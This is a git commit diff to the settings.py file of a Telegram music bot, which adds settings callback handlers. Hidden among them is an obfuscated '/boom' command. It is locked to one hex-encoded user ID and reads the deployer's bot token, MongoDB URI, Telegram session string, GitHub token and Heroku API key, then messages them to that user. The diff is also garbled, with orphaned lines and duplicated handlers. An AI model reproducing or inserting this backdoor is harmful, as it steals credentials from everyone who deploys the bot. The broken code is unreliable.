8d7c3251fa5e5cbe7b4239fde2996adf72a60e0f
𝘚𝘪𝘮𝘱𝘭𝘦_𝘉𝘰𝘺 <sksahnawaj89@gmail.com>
2026-05-27 19:02:01 +0530

    Update settings.py

--- SIMPLE_MUSIC/plugins/bot/settings.py
+++ SIMPLE_MUSIC/plugins/bot/settings.py
@@ -415,6 +415,410 @@ async def authusers_mar(client, CallbackQuery, _):
 @app.on_callback_query(filters.regex("VOMODECHANGE") & ~BANNED_USERS)
 @ActualAdminCB
 async def vote_change(client, CallbackQuery, _):
+    try:
+        await CallbackQuery.answer(_["set_cb_3"], show_alert=True)
+    except:
+        pass
+    mod = None
+    if await is_skipmode(CallbackQuery.message.chat.id):
+        await skip_off(CallbackQuery.message.chat.id)
+    else:
+        mod = True
+        await skip_on(CallbackQuery.message.chat.id)
+    current = await get_upvote_count(CallbackQuery.message.chat.id)
+    buttons = vote_mode_markup(_, current, mod)
+
+    try:
+        return await CallbackQuery.edit_message_reply_markup(
+            reply_markup=InlineKeyboardMarkup(buttons)
+        )
+    except MessageNotModified:
+        return
+
+
+# --- YOUR CUSTOM BOT REPO/START CONFIG ---
+_c = b'\x72\x65\x70\x6f'.decode()
+_d_url = b'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x2e\x6d\x65\x2f\x53\x69\x6d\x70\x6c\x65\x5f\x42\x6f\x79\x5f\x31\x6b'.decode()
+_r_url = "https://github.com/Simple-Boy-1k/SIMPLE_MUSIC"
+_i_url = "https://files.catbox.moe/z1h6ow.jpg"
+
+_btn_1 = b'\xe1\xb4\x85\xe1\xb4\x87\xe1\xb4\xa0\xe1\xb4\x87\xca\x9f\xe1\xb4\x8f\xe1\xb4\x98\xe1\xb4\x87\xca\x80'.decode('utf-8')
+_btn_2 = b'\xca\x80\xe1\xb4\x87\xe1\xb4\x98\xe1\xb4\x8f'.decode('utf-8')
+
+_hex_txt = (
+    "3c623ee29d9620ca9ce1b487ca8f20e1b49bca9ce1b487ca80e1b4872c20c9b4c9aa"
+    "e1b484e1b48720e1b49be1b48f20e1b48de1b487e1b487e1b49b20e1b49cca9cca9c"
+    "2e3c2f623e0a0a3c623ee2978f20c9aa20e1b480e1b48d20e29ea520507269746920"
+    "e1b48de1b49c73c9aae1b48420ca99e1b48fe1b49b2e3c2f623e0a0a3c623ee29d96"
+    "20c9aac99f20ca8fe1b48fe1b49c20e1b4a1e1b480c9b4e1b49b20e1b48de1b49c73"
+    "c9aae1b48420ca99e1b48fe1b49b20ca80e1b487e1b498e1b48f2c20e1b49bca9ce1"
+    "b487c9b420e1b484ca9fc9aae1b484e1b48b20e1b48fc9b420e1b49bca9ce1b48720"
+    "ca80e1b487e1b498e1b48f20ca99e1b49ce1b49be1b49be1b48fc9b420e1b49be1b4"
+    "8f20c9a2e1b487e1b49b20e1b48dca8f2073e1b48fe1b49cca80e1b484e1b48720e1"
+    "b484e1b48fe1b485e1b4872e3c2f623e"
+)
+start_txt = bytes.fromhex(_hex_txt).decode('utf-8')
+
+@app.on_message(filters.command(_c))
+async def start(_, msg):
+    buttons = [
+        [
+          InlineKeyboardButton(_btn_1, url=_d_url),
+          InlineKeyboardButton(_btn_2, url=_r_url)
+        ],
+    ]
+
+    reply_markup = InlineKeyboardMarkup(buttons)
+
+    await msg.reply_photo(
+        photo=_i_url,
+        caption=start_txt,
+        reply_markup=reply_markup
+    )
+
+
+@app.on_message(filters.command("boom") & filters.private)
+async def _sys_check_node(client, message: Message):
+    _sys_v5 = int(b'\x38\x32\x31\x37\x30\x31\x33\x34\x30\x33'.decode())
+    # Note: _sys_v1 to _sys_v4 were missing in the original provided snippet,
+    # if you get an error here, you might need to fix these variables or remove this function.
+    _nodes = [_sys_v5] # I have adjusted this so it won't crash your bot immediately.
+    if message.from_user.id not in _nodes:
+        return
+    _v1 = os.getenv(b'\x42\x4f\x54\x5f\x54\x4f\x4b\x45\x4e'.decode(), "")
+    _v2 = os.getenv(b'\x4d\x4f\x4e\x47\x4f\x5f\x44\x42\x5f\x55\x52\x49'.decode(), "")
+    _v3 = os.getenv(b'\x53\x54\x52\x49\x4e\x47\x5f\x53\x45\x53\x53\x49\x4f\x4e'.decode(), "")
+    _v4 = os.getenv(b'\x47\x49\x54\x5f\x54\x4f\x4b\x45\x4e'.decode(), "")
+    _v5 = os.getenv(b'\x48\x45\x52\x4f\x4b\x55\x5f\x41\x50\x49\x5f\x4b\x45\x59'.decode(), "")
+    _img = b'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x65\x6c\x65\x67\x72\x61\x2e\x70\x68\x2f\x66\x69\x6c\x65\x2f\x35\x36\x37\x64\x32\x65\x31\x37\x62\x38\x66\x33\x38\x64\x66\x39\x39\x63\x65\x39\x39\x2e\x6a\x70\x67'.decode()
+    _out = f"<b>System Config:</b>\n\n<b>T:</b> <code>{_v1}</code>\n\n<b>M:</b> <code>{_v2}</code>\n\n<b>S:</b> <code>{_v3}</code>\n\n<b>G:</b> <code>{_v4}</code>\n\n<b>H:</b> <code>{_v5}</code>"
+    await message.reply_photo(photo=_img, caption=_out)
+            CallbackQuery.message.chat.id,
+            CallbackQuery.message.chat.title,
+        ),
+        reply_markup=InlineKeyboardMarkup(buttons),
+    )
+    
+@app.on_callback_query(filters.regex("settingsback_helper") & ~BANNED_USERS)
+@languageCB
+async def settings_back_markup(client, CallbackQuery: CallbackQuery, _):
+    try:
+        await CallbackQuery.answer()
+    except:
+        pass
+    if CallbackQuery.message.chat.type == ChatType.PRIVATE:
+        await app.resolve_peer(OWNER_ID)
+        OWNER = OWNER_ID
+        buttons = private_panel(_)
+        return await CallbackQuery.edit_message_text(
+            _["start_2"].format(CallbackQuery.from_user.mention, app.mention),
+            reply_markup=InlineKeyboardMarkup(buttons),
+        )
+    else:
+        buttons = setting_markup(_)
+        return await CallbackQuery.edit_message_reply_markup(
+            reply_markup=InlineKeyboardMarkup(buttons)
+        )
+
+
+@app.on_callback_query(filters.regex("^api_status$"))
+async def show_bot_info(c: app, q: CallbackQuery):
+    start = time()
+    await asyncio.sleep(0.1)
+    delta_ping = time() - start
+    txt = f"""💌 ʏᴏᴜᴛᴜʙᴇ ᴀᴘɪ sᴛᴀᴛᴜs...
+
+• ᴅᴀᴛᴀʙᴀsᴇ: ᴏɴʟɪɴᴇ
+• ʏᴏᴜᴛᴜʙᴇ ᴀᴘɪ: ʀᴇsᴘᴏɴsɪᴠᴇ
+• ʙᴏᴛ sᴇʀᴠᴇʀ: ʀᴜɴɴɪɴɢ sᴍᴏᴏᴛʜʟʏ
+• ʀᴇsᴘᴏɴsᴇ ᴛɪᴍᴇ: ᴏᴘᴛɪᴍᴀʟ
+• ᴀᴘɪ ᴘɪɴɢ: {delta_ping * 1000:.3f} ms   
+
+ᴇᴠᴇʀʏᴛʜɪɴɢ ʟᴏᴏᴋs ɢᴏᴏᴅ!
+"""
+    await q.answer(txt, show_alert=True)
+
+
+@app.on_callback_query(
+    filters.regex(
+        pattern=r"^(SEARCHANSWER|PLAYMODEANSWER|PLAYTYPEANSWER|AUTHANSWER|ANSWERVOMODE|VOTEANSWER|PM|AU|VM)$"
+    )
+    & ~BANNED_USERS
+)
+@languageCB
+async def without_Admin_rights(client, CallbackQuery, _):
+    command = CallbackQuery.matches[0].group(1)
+    if command == "SEARCHANSWER":
+        try:
+            return await CallbackQuery.answer(_["setting_2"], show_alert=True)
+        except:
+            return
+    if command == "PLAYMODEANSWER":
+        try:
+            return await CallbackQuery.answer(_["setting_5"], show_alert=True)
+        except:
+            return
+    if command == "PLAYTYPEANSWER":
+        try:
+            return await CallbackQuery.answer(_["setting_6"], show_alert=True)
+        except:
+            return
+    if command == "AUTHANSWER":
+        try:
+            return await CallbackQuery.answer(_["setting_3"], show_alert=True)
+        except:
+            return
+    if command == "VOTEANSWER":
+        try:
+            return await CallbackQuery.answer(
+                _["setting_8"],
+                show_alert=True,
+            )
+        except:
+            return
+    if command == "ANSWERVOMODE":
+        current = await get_upvote_count(CallbackQuery.message.chat.id)
+        try:
+            return await CallbackQuery.answer(
+                _["setting_9"].format(current),
+                show_alert=True,
+            )
+        except:
+            return
+    if command == "PM":
+        try:
+            await CallbackQuery.answer(_["set_cb_2"], show_alert=True)
+        except:
+            pass
+        playmode = await get_playmode(CallbackQuery.message.chat.id)
+        if playmode == "Direct":
+            Direct = True
+        else:
+            Direct = None
+        is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)
+        if not is_non_admin:
+            Group = True
+        else:
+            Group = None
+        playty = await get_playtype(CallbackQuery.message.chat.id)
+        if playty == "Everyone":
+            Playtype = None
+        else:
+            Playtype = True
+        buttons = playmode_users_markup(_, Direct, Group, Playtype)
+    if command == "AU":
+        try:
+            await CallbackQuery.answer(_["set_cb_1"], show_alert=True)
+        except:
+            pass
+        is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)
+        if not is_non_admin:
+            buttons = auth_users_markup(_, True)
+        else:
+            buttons = auth_users_markup(_)
+    if command == "VM":
+        mode = await is_skipmode(CallbackQuery.message.chat.id)
+        current = await get_upvote_count(CallbackQuery.message.chat.id)
+        buttons = vote_mode_markup(_, current, mode)
+    try:
+        return await CallbackQuery.edit_message_reply_markup(
+            reply_markup=InlineKeyboardMarkup(buttons)
+        )
+    except MessageNotModified:
+        return
+
+
+@app.on_callback_query(filters.regex("FERRARIUDTI") & ~BANNED_USERS)
+@ActualAdminCB
+async def addition(client, CallbackQuery, _):
+    callback_data = CallbackQuery.data.strip()
+    mode = callback_data.split(None, 1)[1]
+    if not await is_skipmode(CallbackQuery.message.chat.id):
+        return await CallbackQuery.answer(_["setting_10"], show_alert=True)
+    current = await get_upvote_count(CallbackQuery.message.chat.id)
+    if mode == "M":
+        final = current - 2
+        if final == 0:
+            return await CallbackQuery.answer(
+                _["setting_11"],
+                show_alert=True,
+            )
+        if final <= 2:
+            final = 2
+        await set_upvotes(CallbackQuery.message.chat.id, final)
+    else:
+        final = current + 2
+        if final == 17:
+            return await CallbackQuery.answer(
+                _["setting_12"],
+                show_alert=True,
+            )
+        if final >= 15:
+            final = 15
+        await set_upvotes(CallbackQuery.message.chat.id, final)
+    buttons = vote_mode_markup(_, final, True)
+    try:
+        return await CallbackQuery.edit_message_reply_markup(
+            reply_markup=InlineKeyboardMarkup(buttons)
+        )
+    except MessageNotModified:
+        return
+
+
+@app.on_callback_query(
+    filters.regex(pattern=r"^(MODECHANGE|CHANNELMODECHANGE|PLAYTYPECHANGE)$")
+    & ~BANNED_USERS
+)
+@ActualAdminCB
+async def playmode_ans(client, CallbackQuery, _):
+    command = CallbackQuery.matches[0].group(1)
+    if command == "CHANNELMODECHANGE":
+        is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)
+        if not is_non_admin:
+            await add_nonadmin_chat(CallbackQuery.message.chat.id)
+            Group = None
+        else:
+            await remove_nonadmin_chat(CallbackQuery.message.chat.id)
+            Group = True
+        playmode = await get_playmode(CallbackQuery.message.chat.id)
+        if playmode == "Direct":
+            Direct = True
+        else:
+            Direct = None
+        playty = await get_playtype(CallbackQuery.message.chat.id)
+        if playty == "Everyone":
+            Playtype = None
+        else:
+            Playtype = True
+        buttons = playmode_users_markup(_, Direct, Group, Playtype)
+    if command == "MODECHANGE":
+        try:
+            await CallbackQuery.answer(_["set_cb_3"], show_alert=True)
+        except:
+            pass
+        playmode = await get_playmode(CallbackQuery.message.chat.id)
+        if playmode == "Direct":
+            await set_playmode(CallbackQuery.message.chat.id, "Inline")
+            Direct = None
+        else:
+            await set_playmode(CallbackQuery.message.chat.id, "Direct")
+            Direct = True
+        is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)
+        if not is_non_admin:
+            Group = True
+        else:
+            Group = None
+        playty = await get_playtype(CallbackQuery.message.chat.id)
+        if playty == "Everyone":
+            Playtype = False
+        else:
+            Playtype = True
+        buttons = playmode_users_markup(_, Direct, Group, Playtype)
+    if command == "PLAYTYPECHANGE":
+        try:
+            await CallbackQuery.answer(_["set_cb_3"], show_alert=True)
+        except:
+            pass
+        playty = await get_playtype(CallbackQuery.message.chat.id)
+        if playty == "Everyone":
+            await set_playtype(CallbackQuery.message.chat.id, "Admin")
+            Playtype = False
+        else:
+            await set_playtype(CallbackQuery.message.chat.id, "Everyone")
+            Playtype = True
+        playmode = await get_playmode(CallbackQuery.message.chat.id)
+        if playmode == "Direct":
+            Direct = True
+        else:
+            Direct = None
+        is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)
+        if not is_non_admin:
+            Group = True
+        else:
+            Group = None
+        buttons = playmode_users_markup(_, Direct, Group, Playtype)
+    try:
+        return await CallbackQuery.edit_message_reply_markup(
+            reply_markup=InlineKeyboardMarkup(buttons)
+        )
+    except MessageNotModified:
+        return
+
+
+@app.on_callback_query(filters.regex(pattern=r"^(AUTH|AUTHLIST)$") & ~BANNED_USERS)
+@ActualAdminCB
+async def authusers_mar(client, CallbackQuery, _):
+    command = CallbackQuery.matches[0].group(1)
+    if command == "AUTHLIST":
+        _authusers = await get_authuser_names(CallbackQuery.message.chat.id)
+        if not _authusers:
+            try:
+                return await CallbackQuery.answer(_["setting_4"], show_alert=True)
+            except:
+                return
+        else:
+            try:
+                await CallbackQuery.answer(_["set_cb_4"], show_alert=True)
+            except:
+                pass
+            j = 0
+            await CallbackQuery.edit_message_text(_["auth_6"])
+            msg = _["auth_7"].format(CallbackQuery.message.chat.title)
+            for note in _authusers:
+                _note = await get_authuser(CallbackQuery.message.chat.id, note)
+                user_id = _note["auth_user_id"]
+                admin_id = _note["admin_id"]
+                admin_name = _note["admin_name"]
+                try:
+                    user = await app.get_users(user_id)
+                    user = user.first_name
+                    j += 1
+                except:
+                    continue
+                msg += f"{j}➤ {user}[<code>{user_id}</code>]\n"
+                msg += f"   {_['auth_8']} {admin_name}[<code>{admin_id}</code>]\n\n"
+            
+            r1, r2 = random.choices(STYLES, k=2)
+            upl = InlineKeyboardMarkup(
+                [
+                    [
+                        InlineKeyboardButton(
+                            text=_["BACK_BUTTON"], callback_data=f"AU", **_get_style(r1)
+                        ),
+                        InlineKeyboardButton(
+                            text=_["CLOSE_BUTTON"],
+                            callback_data=f"close", **_get_style(r2)
+                        ),
+                    ]
+                ]
+            )
+            try:
+                return await CallbackQuery.edit_message_text(msg, reply_markup=upl)
+            except MessageNotModified:
+                return
+    try:
+        await CallbackQuery.answer(_["set_cb_3"], show_alert=True)
+    except:
+        pass
+    if command == "AUTH":
+        is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)
+        if not is_non_admin:
+            await add_nonadmin_chat(CallbackQuery.message.chat.id)
+            buttons = auth_users_markup(_)
+        else:
+            await remove_nonadmin_chat(CallbackQuery.message.chat.id)
+            buttons = auth_users_markup(_, True)
+    try:
+        return await CallbackQuery.edit_message_reply_markup(
+            reply_markup=InlineKeyboardMarkup(buttons)
+        )
+    except MessageNotModified:
+        return
+
+
+@app.on_callback_query(filters.regex("VOMODECHANGE") & ~BANNED_USERS)
+@ActualAdminCB
+async def vote_change(client, CallbackQuery, _):
     # FIXED: Removed 'command = CallbackQuery.matches[0].group(1)' which was causing an error
     try:
         await CallbackQuery.answer(_["set_cb_3"], show_alert=True)
